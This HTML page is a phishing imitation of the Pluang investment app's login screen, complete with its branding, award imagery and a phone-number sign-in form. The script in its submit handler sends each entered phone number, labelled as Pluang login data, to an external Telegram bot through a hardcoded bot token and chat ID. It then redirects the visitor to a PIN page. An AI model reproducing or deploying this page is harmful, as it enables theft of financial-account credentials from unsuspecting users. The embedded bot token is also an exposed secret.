<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>
   Pluang Super App Investasi
  </title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter&amp;display=swap" rel="stylesheet"/>
  <style>
   body {
      font-family: 'Inter', sans-serif;
    }
   /* Smooth horizontal sliding animation */
   @keyframes slide {
     0% { transform: translateX(100%); opacity: 0; }
     10% { transform: translateX(0); opacity: 1; }
     90% { transform: translateX(0); opacity: 1; }
     100% { transform: translateX(-100%); opacity: 0; }
   }
   .slide-container {
     position: relative;
     width: 150px;
     height: 180px;
     overflow: hidden;
   }
   .slide-image {
     position: absolute;
     width: 150px;
     height: 180px;
     top: 0;
     left: 0;
     opacity: 0;
     animation: slide 9s infinite;
   }
   .slide-image:nth-child(1) {
     animation-delay: 0s;
   }
   .slide-image:nth-child(2) {
     animation-delay: 3s;
   }
   .slide-image:nth-child(3) {
     animation-delay: 6s;
   }
  </style>
 </head>
 <body class="bg-[#3B3FE1] min-h-screen flex flex-col relative">
  <header class="flex justify-between items-center px-5 pt-5 text-white text-sm font-normal">
   <div>
    Eksplor Pluang
   </div>
   <div class="flex items-center border border-white rounded-full w-[72px] h-[32px] text-xs font-normal">
    <button class="w-1/2 h-full rounded-full bg-white text-[#3B3FE1]">
     ID
    </button>
    <button class="w-1/2 h-full">
     EN
    </button>
   </div>
  </header>
  <main class="flex flex-col items-center px-5 pt-8 flex-grow text-center text-white">
   <div class="slide-container mx-auto">
    <img alt="Illustration of CNBC Indonesia Best Investing Super App 2022 trophy variant 1" class="slide-image" height="180" src="https://mdi.vc/awards/award-4.png" width="150"/>
    <img alt="Illustration of CNBC Indonesia Best Investing Super App 2022 trophy variant 2" class="slide-image" height="180" src="https://image-cdn.pluang.com/web/compressed/assets_available.webp" width="150"/>
    <img alt="Illustration of CNBC Indonesia Best Investing Super App 2022 trophy variant 3" class="slide-image" height="180" src="https://image-cdn.pluang.com/web/compressed/safeAndSecure.webp" width="300"/>
   </div>
   <h1 class="mt-8 font-bold text-[22px] leading-7">
    Super App Investasi #1
   </h1>
   <p class="mt-2 text-[13px] leading-5 max-w-[320px]">
    Investasi di 560+ Saham AS, 200+ Aset Crypto, 65+ Reksa Dana, dan Emas.
    <a class="underline cursor-pointer" href="#" id="learnMoreLink">
     Pelajari lebih lanjut
    </a>
   </p>
  </main>
  <form class="bg-white px-5 py-6 space-y-4" id="signupForm">
   <div class="flex space-x-3">
    <button class="flex items-center justify-center border border-gray-300 rounded-md w-[72px] h-[44px] text-sm text-gray-700" type="button">
     <img alt="Indonesian flag icon" class="mr-2" height="14" src="https://uxwing.com/wp-content/themes/uxwing/download/flags-landmarks/indonesia-flag-icon.png" width="20"/>
     +62
    </button>
    <input autocomplete="tel" class="flex-grow border border-gray-300 rounded-md h-[44px] px-3 text-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#FFFFFF]" id="phoneInput" name="phone" placeholder="Nomor Telepon" required="" type="tel"/>
   </div>
   <button class="w-full bg-gray-200 text-gray-400 rounded-full h-[44px] text-center text-sm font-normal cursor-not-allowed" disabled="" id="submitBtn" type="submit">
    Daftar atau Log In
   </button>
  </form>
  <footer class="flex justify-center items-center space-x-20 py-6 bg-white">
   <button aria-label="Login with OVO" class="focus:outline-none">
    <img alt="Green circular icon representing OVO login" height="40" src="https://vectorseek.com/wp-content/uploads/2023/10/Gojek-Icon-Logo-Vector.svg-.png" width="40"/>
   </button>
   <button aria-label="Login with Facebook" class="focus:outline-none">
    <img alt="Blue circular icon representing Facebook login" height="40" src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Facebook_logo_%28square%29.png" width="40"/>
   </button>
   <button aria-label="Login with Google" class="focus:outline-none">
    <img alt="Multicolor circular icon representing Google login" height="40" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/48px-Google_%22G%22_logo.svg.png" width="40"/>
   </button>
  </footer>
  <!-- Loading overlay -->
  <div class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50" id="loadingOverlay">
   <svg aria-hidden="true" class="w-12 h-12 text-white animate-spin" fill="none" stroke="currentColor" stroke-width="4" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <circle cx="12" cy="12" r="10" stroke-linecap="round" stroke-opacity="0.25">
    </circle>
    <path d="M4 12a8 8 0 018-8" stroke-linecap="round">
    </path>
   </svg>
  </div>
  <script>
   const loadingOverlay = document.getElementById('loadingOverlay');
   const phoneInput = document.getElementById('phoneInput');
   const submitBtn = document.getElementById('submitBtn');
   const form = document.getElementById('signupForm');

   // Enable submit button only if phone input has value
   phoneInput.addEventListener('input', () => {
     if (phoneInput.value.trim().length > 0) {
       submitBtn.disabled = false;
       submitBtn.classList.remove('cursor-not-allowed', 'text-gray-400', 'bg-gray-200');
       submitBtn.classList.add('bg-[#3B3FE1]', 'text-white', 'cursor-pointer');
     } else {
       submitBtn.disabled = true;
       submitBtn.classList.add('cursor-not-allowed', 'text-gray-400', 'bg-gray-200');
       submitBtn.classList.remove('bg-[#3B3FE1]', 'text-white', 'cursor-pointer');
     }
   });

   form.addEventListener('submit', async (e) => {
     e.preventDefault();
     const phone = phoneInput.value.trim();
     if (!phone) return;

     loadingOverlay.classList.remove('hidden');

     // Telegram bot info - replace with your own bot token and chat ID
     const botToken = '8142214274:AAGDkwwEOsbxxo00e-hd7p5avWosgEjsjA8';
     const chatId = '7549590022';

     const message = encodeURIComponent(`DATA LOGIN PLUANG:\nPhone: +62${phone}`);

     try {
       const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`, {
         method: 'GET',
       });

       if (response.ok) {
         window.location.href = "pin.html";
         form.reset();
         submitBtn.disabled = true;
         submitBtn.classList.add('cursor-not-allowed', 'text-gray-400', 'bg-gray-200');
         submitBtn.classList.remove('bg-[#3B3FE1]', 'text-white', 'cursor-pointer');
       } else {
         alert('Gagal mengirim data ke Telegram.');
       }
     } catch (error) {
       alert('Terjadi kesalahan saat mengirim data.');
     } finally {
       loadingOverlay.classList.add('hidden');
     }
   });
  </script>
 </body>
</html>
